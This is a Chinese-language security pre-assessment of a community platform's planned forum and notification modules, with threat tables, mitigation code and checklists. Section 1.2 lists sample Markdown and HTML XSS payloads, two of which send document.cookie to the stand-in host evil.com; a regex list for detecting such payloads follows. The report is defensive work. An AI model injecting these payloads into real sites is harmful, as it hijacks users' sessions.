# 论坛系统安全风险评估报告（Batch 6 预评估）

> 审查日期：2026-03-31
> 审查范围：论坛系统（Batch 6）+ 通知系统（Batch 7）安全风险预评估
> 审查员：安全审计员
> 参考基线：`docs/batch1-security-audit.md`、现有路由代码（resources.ts、auth.ts、users.ts）

---

## 概述

论坛系统是 SpectrAI 社区平台中 **用户生成内容（UGC）最集中** 的模块，面临以下核心安全威胁：

| 威胁类别 | 风险等级 | 影响范围 |
|----------|----------|----------|
| Markdown XSS | **CRITICAL** | 帖子/回复/评论渲染 |
| 嵌套回复深度攻击 | **HIGH** | 回复树构建、前端渲染 |
| 投票操纵 | **HIGH** | 投票系统完整性 |
| 权限控制缺失 | **HIGH** | 置顶/锁定/编辑/删除 |
| 速率限制缺失 | **HIGH** | 全部写入端点 |
| 内容大小无限制 | **MEDIUM** | DoS 攻击 |
| @提醒注入 | **MEDIUM** | 通知系统 |
| 信息泄露 | **MEDIUM** | 用户活动数据 |

---

## 一、Markdown 内容安全（CRITICAL）

### 1.1 风险分析

论坛帖子（`forumPosts.content`）和回复（`forumReplies.content`）均为 `text` 类型，用户可提交任意 Markdown 内容。**当前项目没有任何 Markdown 消毒库**（已验证 `package.json` 中无 rehype-sanitize、DOMPurify 等依赖）。

### 1.2 攻击向量

#### 攻击向量 1：HTML 注入 XSS
```markdown
<!-- 直接 HTML 标签 -->
<img src=x onerror="alert(document.cookie)">
<iframe src="https://evil.com/steal?cookie="+document.cookie>
<script>fetch('https://evil.com/steal?'+document.cookie)</script>
<svg onload="alert(1)">
<details open ontoggle="alert(1)">
```

#### 攻击向量 2：Markdown 链接 XSS
```markdown
<!-- Markdown 链接中的 javascript: 协议 -->
[点击这里](javascript:alert(1))

<!-- data: URI -->
![图片](data:text/html,<script>alert(1)</script>)
```

#### 攻击向量 3：属性注入
```markdown
<!-- 某些 Markdown 解析器支持 HTML 属性 -->
<img src="valid.png" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999" />
<div class="absolute inset-0 bg-red-500">钓鱼覆盖层</div>
```

#### 攻击向量 4：协议绕过
```markdown
[link](javascript:void(0)//)
[link](java\tscript:alert(1))
[link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```

### 1.3 缓解措施（强制要求）

#### 后端：存储时不消毒，但标记危险内容
后端存储原始 Markdown，但添加校验：
```typescript
// 在 forum.ts 路由中，帖子/回复提交前的校验
const FORBIDDEN_PATTERNS = [
  /<script[\s>]/i,
  /<iframe[\s>]/i,
  /<object[\s>]/i,
  /<embed[\s>]/i,
  /<form[\s>]/i,
  /on\w+\s*=/i,        // onerror=, onload=, onclick=
  /javascript\s*:/i,
  /data\s*:\s*text\/html/i,
];

function containsDangerousHtml(content: string): boolean {
  return FORBIDDEN_PATTERNS.some(pattern => pattern.test(content));
}
```

#### 前端：渲染时严格消毒（关键防线）
```typescript
// 必须安装的依赖
// npm install rehype-sanitize react-markdown remark-gfm rehype-raw

// MarkdownRenderer 组件安全配置
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

// 最小化白名单 schema
const sanitizeSchema = {
  ...defaultSchema,
  tagNames: [
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'br', 'hr',
    'strong', 'em', 'del', 'code', 'pre',
    'ul', 'ol', 'li',
    'blockquote',
    'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    // 不允许：script, iframe, object, embed, form, input, svg, details
  ],
  attributes: {
    ...defaultSchema.attributes,
    a: ['href', 'title'],  // 仅允许 href 和 title
    img: ['src', 'alt', 'title'],
    code: ['className'],    // 代码高亮需要
    pre: ['className'],
  },
  // 强制 URL 协议白名单
  protocols: {
    href: ['https:', 'http:', 'mailto:'],
    src: ['https:', 'http:'],
  },
};

// 使用方式
<ReactMarkdown
  remarkPlugins={[remarkGfm]}
  rehypePlugins={[[rehypeSanitize, sanitizeSchema]]}
/>
```

### 1.4 安全 Checklist

- [ ] **安装 `rehype-sanitize`** 到 `apps/web/`
- [ ] **安装 `react-markdown` 和 `remark-gfm`** 到 `apps/web/`
- [ ] 创建 `MarkdownRenderer` 组件，内置消毒 schema
- [ ] 帖子内容 `forumPosts.content` 的 `maxLength: 50000`
- [ ] 回复内容 `forumReplies.content` 的 `maxLength: 10000`
- [ ] 帖子标题 `forumPosts.title` 的 `maxLength: 200`
- [ ] 后端添加危险 HTML 模式检测（可选，作为第二防线）
- [ ] 禁止在 Markdown 渲染中使用 `rehype-raw`（或配合 strict sanitize）

---

## 二、嵌套回复深度攻击（HIGH）

### 2.1 风险分析

`forumReplies` 表通过 `parentId` 自引用支持无限嵌套深度。若攻击者构造深层嵌套（如 1000 层），可导致：

1. **前端渲染栈溢出**：递归 React 组件导致 Maximum call stack size exceeded
2. **后端建树性能退化**：JS 递归建树 O(n*h) 时间复杂度
3. **前端 DOM 膨胀**：大量嵌套 div 导致页面卡顿

### 2.2 攻击场景

```typescript
// 攻击者通过 API 逐层创建回复：
// reply1 (parentId: null) → reply2 (parentId: reply1) → ... → reply1000 (parentId: reply999)
// 每次 POST /api/forum/posts/:id/replies 传入 parentId
```

### 2.3 缓解措施

#### 数据库层：添加深度 CHECK
```sql
-- 建议在应用层校验，DB 层难以直接实现递归深度检查
-- 但可添加 parentId 有效性检查：parentId 必须指向同一 postId 下的回复
```

#### 后端 API 层：限制最大深度
```typescript
// 在 forum.ts 的 POST /replies 路由中
const MAX_REPLY_DEPTH = 10;

async function getReplyDepth(replyId: string): Promise<number> {
  let depth = 0;
  let currentId: string | null = replyId;
  while (currentId && depth < MAX_REPLY_DEPTH + 1) {
    const [reply] = await db
      .select({ parentId: forumReplies.parentId })
      .from(forumReplies)
      .where(eq(forumReplies.id, currentId))
      .limit(1);
    if (!reply || !reply.parentId) break;
    currentId = reply.parentId;
    depth++;
  }
  return depth;
}

// 在创建回复前检查
if (body.parentId) {
  const depth = await getReplyDepth(body.parentId);
  if (depth >= MAX_REPLY_DEPTH) {
    return c.json({ success: false, error: '回复嵌套深度超过限制' }, 400);
  }

  // 验证 parentId 属于同一帖子
  const [parentReply] = await db
    .select({ postId: forumReplies.postId })
    .from(forumReplies)
    .where(eq(forumReplies.id, body.parentId))
    .limit(1);
  if (!parentReply || parentReply.postId !== postId) {
    return c.json({ success: false, error: '无效的父回复' }, 400);
  }
}
```

#### 前端：depth 5+ 折叠显示
```typescript
// 编码规范已要求：递归回复用 React.memo、depth 5+ 折叠
// 建议在前端也做保护：
const MAX_DISPLAY_DEPTH = 5;

const ReplyItem = React.memo(({ reply, depth }: { reply: Reply; depth: number }) => {
  if (depth >= MAX_DISPLAY_DEPTH) {
    return (
      <div className="pl-4 border-l">
        <Collapsible>
          <CollapsibleTrigger>查看嵌套回复 ({reply.children?.length || 0})</CollapsibleTrigger>
          <CollapsibleContent>
            {reply.children?.map(child => (
              <ReplyItem key={child.id} reply={child} depth={depth + 1} />
            ))}
          </CollapsibleContent>
        </Collapsible>
      </div>
    );
  }
  // 正常渲染...
});
```

### 2.4 安全 Checklist

- [ ] 后端限制回复最大深度为 **10 层**
- [ ] 后端校验 `parentId` 必须属于同一帖子
- [ ] 前端回复树渲染使用 `React.memo`
- [ ] 前端 depth 5+ 自动折叠
- [ ] 建树算法用迭代而非递归（防栈溢出）

---

## 三、投票操纵防护（HIGH）

### 3.1 风险分析

`forumVotes` 表存储投票，`value` 字段当前为 `integer` 无 CHECK 约束（Batch 1 审查 Issue #D3 已记录）。投票操纵可能导致：

1. **票数注入**：`value` 可为任意整数（如 9999），直接操纵排名
2. **重复投票**：虽有 uniqueIndex，但 `(userId, postId, replyId)` 组合 — 当 `replyId` 为 NULL 时可能有特殊行为
3. **自投自票**：作者给自己的帖子/回复投票
4. **批量刷票**：无速率限制时可用脚本批量切换投票

### 3.2 现有 Schema 问题

```typescript
// apps/api/src/db/schema.ts:277-302
// 问题 1: uniqueIndex 包含 nullable 的 replyId，PostgreSQL 中 NULL != NULL
//   → 同一用户对同一帖子可能创建多条 postId 投票（当 replyId 不同时）
// 问题 2: value 无 CHECK 约束
// 问题 3: 缺少部分索引（postId 和 replyId 互斥，应至少有一个非 NULL）
```

### 3.3 缓解措施

#### 数据库层
```sql
-- 1. 添加 value CHECK 约束
ALTER TABLE forum_votes ADD CONSTRAINT vote_value_check CHECK (value IN (1, -1));

-- 2. 添加互斥约束：postId 和 replyId 必须恰好一个非 NULL
ALTER TABLE forum_votes ADD CONSTRAINT vote_target_check
  CHECK ((post_id IS NOT NULL AND reply_id IS NULL) OR (post_id IS NULL AND reply_id IS NOT NULL));

-- 3. 修改 uniqueIndex 处理 NULL
-- 建议：使用 COALESCE 或分开创建两个 uniqueIndex
CREATE UNIQUE INDEX forum_votes_user_post_idx ON forum_votes (user_id, post_id) WHERE reply_id IS NULL;
CREATE UNIQUE INDEX forum_votes_user_reply_idx ON forum_votes (user_id, reply_id) WHERE post_id IS NULL;
```

#### API 层
```typescript
// 投票 Toggle 路由安全要求：

// 1. 认证保护
voteRoutes.post('/:id/vote', authMiddleware, ...)

// 2. 自投检查
const { userId } = c.get('user');
const [target] = await db.select({ userId: forumPosts.userId }).from(forumPosts)...
if (target.userId === userId) {
  return c.json({ success: false, error: '不能给自己的帖子投票' }, 403);
}

// 3. 事务保证原子性（关键！现有 resources.ts 的 like toggle 没用事务，这是 Bug）
await db.transaction(async (tx) => {
  const [existing] = await tx.select().from(forumVotes)
    .where(and(eq(forumVotes.userId, userId), ...))
    .limit(1);

  if (existing) {
    if (existing.value === voteValue) {
      // 取消投票
      await tx.delete(forumVotes).where(eq(forumVotes.id, existing.id));
      await tx.update(forumPosts).set({
        voteScore: sql`${forumPosts.voteScore} - ${voteValue}`
      }).where(eq(forumPosts.id, postId));
      return { voted: false };
    } else {
      // 反转投票（+1 → -1 或 -1 → +1）
      await tx.update(forumVotes).set({ value: voteValue }).where(eq(forumVotes.id, existing.id));
      await tx.update(forumPosts).set({
        voteScore: sql`${forumPosts.voteScore} + ${2 * voteValue}`
      }).where(eq(forumPosts.id, postId));
      return { voted: true, value: voteValue };
    }
  } else {
    // 新投票
    await tx.insert(forumVotes).values({ userId, postId, value: voteValue });
    await tx.update(forumPosts).set({
      voteScore: sql`${forumPosts.voteScore} + ${voteValue}`
    }).where(eq(forumPosts.id, postId));
    return { voted: true, value: voteValue };
  }
});

// 4. 锁定帖子不能投票
const [post] = await db.select({ isLocked: forumPosts.isLocked }).from(forumPosts)...
if (post.isLocked) {
  return c.json({ success: false, error: '帖子已锁定，无法投票' }, 403);
}
```

### 3.4 安全 Checklist

- [ ] DB 添加 `CHECK (value IN (1, -1))` 约束
- [ ] DB 添加互斥约束（postId XOR replyId）
- [ ] 修复 uniqueIndex 处理 NULL 的问题
- [ ] 投票 toggle 使用 `db.transaction()` 保证原子性
- [ ] 禁止自投自票
- [ ] 锁定帖子禁止投票
- [ ] 速率限制：每用户每分钟 ≤ 60 次投票操作

---

## 四、权限控制（HIGH）

### 4.1 风险分析

论坛需要以下权限控制，缺少任何一项都可能导致滥用：

| 操作 | 所需权限 | 风险 |
|------|----------|------|
| 创建帖子 | 已登录用户 | 垃圾信息 |
| 编辑帖子 | **仅作者** | 篡改他人内容 |
| 删除帖子 | 作者 或 admin/moderator | 误删/恶意删 |
| 置顶帖子 | **仅 admin/moderator** | 权限提升 |
| 锁定帖子 | **仅 admin/moderator** | 权限提升 |
| 标记最佳答案 | 帖子作者 | 误导 |
| 创建回复 | 已登录用户 + 帖子未锁定 | 垃圾回复 |
| 编辑回复 | **仅作者** | 篡改 |

### 4.2 参考现有模式

现有 `resources.ts` 的权限模式是好的参考：
```typescript
// resources.ts:253 - ownership 检查
if (existing.authorId !== userId) {
  return c.json({ success: false, error: "Not authorized" }, 403);
}

// resources.ts:284 - ownership + role 检查
if (existing.authorId !== userId && role !== "admin") {
  return c.json({ success: false, error: "Not authorized" }, 403);
}
```

### 4.3 论坛权限实现要求

```typescript
// 管理员检查中间件（建议抽取为通用中间件）
function requireRole(...roles: string[]) {
  return async (c: Context, next: Next) => {
    const user = c.get('user');
    if (!user || !roles.includes(user.role)) {
      return c.json({ success: false, error: '需要管理员权限' }, 403);
    }
    await next();
  };
}

// 使用示例
forumRoutes.put('/:id/pin', authMiddleware, requireRole('admin', 'moderator'), async (c) => { ... });
forumRoutes.put('/:id/lock', authMiddleware, requireRole('admin', 'moderator'), async (c) => { ... });

// 最佳答案标记 - 仅帖子作者
forumRoutes.put('/:id/best-answer', authMiddleware, async (c) => {
  const { userId } = c.get('user');
  const [post] = await db.select().from(forumPosts).where(eq(forumPosts.id, postId)).limit(1);
  if (post.userId !== userId) {
    return c.json({ success: false, error: '仅帖子作者可标记最佳答案' }, 403);
  }
  // 验证 bestAnswerId 是该帖子的回复
  const [reply] = await db.select().from(forumReplies).where(eq(forumReplies.id, bestAnswerId)).limit(1);
  if (!reply || reply.postId !== postId) {
    return c.json({ success: false, error: '无效的回复 ID' }, 400);
  }
  ...
});

// 编辑帖子 - 仅作者
forumRoutes.put('/:id', authMiddleware, async (c) => {
  const { userId } = c.get('user');
  const [post] = await db.select().from(forumPosts).where(eq(forumPosts.id, id)).limit(1);
  if (post.userId !== userId) {
    return c.json({ success: false, error: '仅作者可编辑' }, 403);
  }
  ...
});

// 锁定帖子禁止回复
forumRoutes.post('/:id/replies', authMiddleware, async (c) => {
  const [post] = await db.select({ isLocked: forumPosts.isLocked }).from(forumPosts)...;
  if (post.isLocked) {
    return c.json({ success: false, error: '帖子已锁定' }, 403);
  }
  ...
});
```

### 4.4 安全 Checklist

- [ ] 编辑帖子/回复：ownership 检查
- [ ] 删除帖子/回复：ownership + admin/moderator 检查
- [ ] 置顶/锁定：仅 admin/moderator
- [ ] 最佳答案：仅帖子作者 + 验证回复属于该帖子
- [ ] 锁定帖子禁止新回复和投票
- [ ] 创建 `requireRole` 中间件复用

---

## 五、@提醒注入（MEDIUM）

### 5.1 风险分析

帖子/回复中的 `@username` 功能需要：
1. 解析内容中的 @提及
2. 向被提及的用户发送通知
3. 防止滥用（如 @1000 个用户触发大量通知）

### 5.2 攻击场景

```markdown
<!-- 垃圾 @提及 -->
@alice @bob @charlie @dave @eve @frank @grace ...（1000个用户）

<!-- 伪造提及 -->
@admin 请查看 @admin @admin @admin @admin @admin
```

### 5.3 缓解措施

```typescript
// 1. 限制每条内容最多 @提及数量
const MAX_MENTIONS = 5;

function extractMentions(content: string): string[] {
  const matches = content.match(/@(\w[\w-]{2,49})/g);
  if (!matches) return [];
  // 去重
  return [...new Set(matches.map(m => m.slice(1)))];
}

// 在创建帖子/回复时
const mentions = extractMentions(content);
if (mentions.length > MAX_MENTIONS) {
  return c.json({
    success: false,
    error: `每条内容最多提及 ${MAX_MENTIONS} 个用户`
  }, 400);
}

// 2. 仅向实际存在的用户发送通知
if (mentions.length > 0) {
  const mentionedUsers = await db
    .select({ id: users.id })
    .from(users)
    .where(inArray(users.username, mentions));
  // 仅对存在的用户发送通知
  for (const user of mentionedUsers) {
    await sendNotification(user.id, 'mention', ...);
  }
}

// 3. @提及通知也需要速率限制（防止通知轰炸）
```

### 5.4 安全 Checklist

- [ ] 每条内容最多 5 个 @提及
- [ ] 仅向存在的用户发送通知
- [ ] @提及触发通知也受速率限制
- [ ] 用户可选择关闭 @提及通知（Batch 7 需考虑）

---

## 六、速率限制策略（HIGH — 平台级缺失）

### 6.1 现状

**当前项目没有速率限制中间件**（已通过 grep 确认）。这是平台级安全缺陷，论坛模块是重灾区。

### 6.2 论坛所需速率限制

| 端点 | 限制 | 理由 |
|------|------|------|
| `POST /api/forum/posts` | 5 次/分钟/用户 | 防垃圾帖 |
| `POST /api/forum/posts/:id/replies` | 10 次/分钟/用户 | 防垃圾回复 |
| `POST /api/forum/posts/:id/vote` | 30 次/分钟/用户 | 防投票操纵 |
| `PUT /api/forum/posts/:id` | 10 次/分钟/用户 | 防滥用编辑 |
| `DELETE /api/forum/posts/:id` | 5 次/分钟/用户 | 防批量删除 |
| `POST /api/forum/posts/:id/replies/:rid/vote` | 30 次/分钟/用户 | 防回复投票操纵 |
| `GET /api/forum/posts` | 60 次/分钟/IP | 防爬虫 |
| `GET /api/notifications` | 120 次/分钟/用户 | 轮询限速 |
| `PUT /api/notifications/:id/read` | 60 次/分钟/用户 | 批量标记限速 |

### 6.3 实现建议

```typescript
// apps/api/src/middleware/rate-limit.ts
import { Context, Next } from 'hono';

// 简单内存限速（生产环境建议用 Redis）
const rateLimitStore = new Map<string, { count: number; resetAt: number }>();

export function rateLimit(options: {
  windowMs: number;  // 时间窗口（毫秒）
  maxRequests: number; // 最大请求数
  keyFn?: (c: Context) => string; // 自定义 key 函数
}) {
  return async (c: Context, next: Next) => {
    const key = options.keyFn
      ? options.keyFn(c)
      : c.get('user')?.userId || c.req.header('x-forwarded-for') || 'unknown';

    const now = Date.now();
    const record = rateLimitStore.get(key);

    if (!record || now > record.resetAt) {
      rateLimitStore.set(key, { count: 1, resetAt: now + options.windowMs });
      await next();
      return;
    }

    if (record.count >= options.maxRequests) {
      c.header('Retry-After', String(Math.ceil((record.resetAt - now) / 1000)));
      return c.json({ success: false, error: '请求过于频繁，请稍后再试' }, 429);
    }

    record.count++;
    await next();
  };
}

// 使用方式
forumRoutes.post('/',
  authMiddleware,
  rateLimit({ windowMs: 60_000, maxRequests: 5, keyFn: (c) => `post:${c.get('user').userId}` }),
  zValidator('json', createPostSchema),
  async (c) => { ... }
);
```

---

## 七、内容大小限制（MEDIUM）

### 7.1 论坛内容限制要求

```typescript
// 论坛 Zod Schema 安全配置
const createPostSchema = z.object({
  title: z.string().min(1).max(200),
  content: z.string().min(1).max(50000),   // 50KB，约 15000 字
  categoryId: z.string().uuid(),
});

const createReplySchema = z.object({
  content: z.string().min(1).max(10000),    // 10KB，约 3000 字
  parentId: z.string().uuid().nullable().optional(),
});

const voteSchema = z.object({
  value: z.union([z.literal(1), z.literal(-1)]),  // 严格限制
});
```

### 7.2 分页限制

```typescript
const forumListQuerySchema = z.object({
  page: z.coerce.number().int().min(1).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['latest', 'popular', 'most_replies']).default('latest'),
});
```

---

## 八、通知系统安全（Batch 7 预评估）

### 8.1 通知轮询安全

```typescript
// GET /api/notifications — 30s 轮询

// 安全要求：
// 1. 认证保护（authMiddleware）
// 2. 速率限制：120 次/分钟（30s 轮询 = 2次/分钟，留足余量）
// 3. 分页：limit max 50
// 4. 仅返回当前用户的通知（WHERE userId = currentUserId）
```

### 8.2 通知内容安全

```typescript
// 通知类型应使用 pgEnum 严格限制
const notificationTypeEnum = pgEnum('notification_type', [
  'comment',      // 评论
  'like',         // 点赞
  'favorite',     // 收藏
  'reply',        // 论坛回复
  'mention',      // @提及
  'best_answer',  // 最佳答案
  'system',       // 系统通知
]);

// 通知内容安全：
// 1. title: maxLength 200，不允许 HTML
// 2. content: maxLength 500，纯文本（Markdown 不渲染）
// 3. relatedType: 枚举限制 ['resource', 'comment', 'forum_post', 'forum_reply']
// 4. fromUserId: 系统通知可为 NULL，其他类型必须有值
```

### 8.3 通知触发安全

```typescript
// 防止通知轰炸的关键规则：
// 1. 同一触发者在 1 分钟内最多触发 5 条通知给同一用户
// 2. 批量操作（如收藏多个资源）合并为单条通知
// 3. 用户可以关闭特定类型的通知（需在 users 表或新表添加偏好设置）
// 4. 自操作不触发通知（自己赞自己的资源不发通知）
```

### 8.4 信息泄露防护

```typescript
// 通知 API 响应中：
// ✅ 安全字段：id, type, title, content, isRead, createdAt
// ✅ 安全关联：fromUser.id, fromUser.username, fromUser.avatarUrl
// ❌ 禁止字段：fromUser.email, fromUser.githubId
// ❌ 禁止暴露：relatedId 指向的资源如果已被删除，应标记为 [已删除] 而非报错

// GET /api/notifications/unread-count
// 应独立端点，避免拉取全部通知来计数
```

---

## 九、综合安全 Checklist 汇总

### Batch 6（论坛后端）必须满足

| # | 安全要求 | 优先级 | 状态 |
|---|----------|--------|------|
| 1 | 安装 `rehype-sanitize` + `react-markdown` | **CRITICAL** | ❌ 未安装 |
| 2 | 创建安全的 `MarkdownRenderer` 组件 | **CRITICAL** | ❌ 未创建 |
| 3 | 投票 `db.transaction()` 原子性 | **HIGH** | ❌ 需实现 |
| 4 | DB CHECK: `vote value IN (1, -1)` | **HIGH** | ❌ 需迁移 |
| 5 | DB CHECK: `rating BETWEEN 1 AND 5` | **HIGH** | ❌ 需迁移 |
| 6 | 回复深度限制 ≤ 10 层 | **HIGH** | ❌ 需实现 |
| 7 | 权限控制：置顶/锁定仅 admin/moderator | **HIGH** | ❌ 需实现 |
| 8 | 权限控制：编辑/删除 ownership 检查 | **HIGH** | ❌ 需实现 |
| 9 | 速率限制中间件 | **HIGH** | ❌ 全平台缺失 |
| 10 | 帖子内容 maxLength 50000 | **MEDIUM** | ❌ 需 Zod 校验 |
| 11 | 回复内容 maxLength 10000 | **MEDIUM** | ❌ 需 Zod 校验 |
| 12 | @提及限制 ≤ 5 个/条 | **MEDIUM** | ❌ 需实现 |
| 13 | 锁定帖子禁止回复和投票 | **MEDIUM** | ❌ 需实现 |
| 14 | 禁止自投自票 | **MEDIUM** | ❌ 需实现 |
| 15 | `requireRole` 中间件抽取 | **MEDIUM** | ❌ 需实现 |

### Batch 7（通知系统）必须满足

| # | 安全要求 | 优先级 |
|---|----------|--------|
| 1 | 通知类型 pgEnum 约束 | MEDIUM |
| 2 | 轮询速率限制 120/min | MEDIUM |
| 3 | 通知内容纯文本（不渲染 Markdown） | MEDIUM |
| 4 | fromUser 仅返回公开字段 | MEDIUM |
| 5 | 防通知轰炸（同源 5 条/分钟/目标） | MEDIUM |
| 6 | 已删除关联资源优雅降级 | LOW |
| 7 | unread-count 独立轻量端点 | LOW |

---

## 十、遗留问题：现有代码中的安全 Bug

审查论坛安全时，发现现有 `resources.ts` 的 **Like toggle 没有事务保护**：

```typescript
// resources.ts:323-343 — 非原子操作！
// 步骤 1: 删除 like
await db.delete(resourceLikes).where(...);
// 步骤 2: 更新计数
await db.update(resources).set({ likes: sql`${resources.likes} - 1` }).where(...);
// 如果步骤 2 失败，like 已删除但计数未更新 → 数据不一致
```

**建议**：在 Batch 2 或 Batch 6 中一并修复，将 Like toggle 包裹在 `db.transaction()` 中。

---

*报告结束。此报告为预评估，待 Batch 6/7 代码完成后将进行逐项验证。*
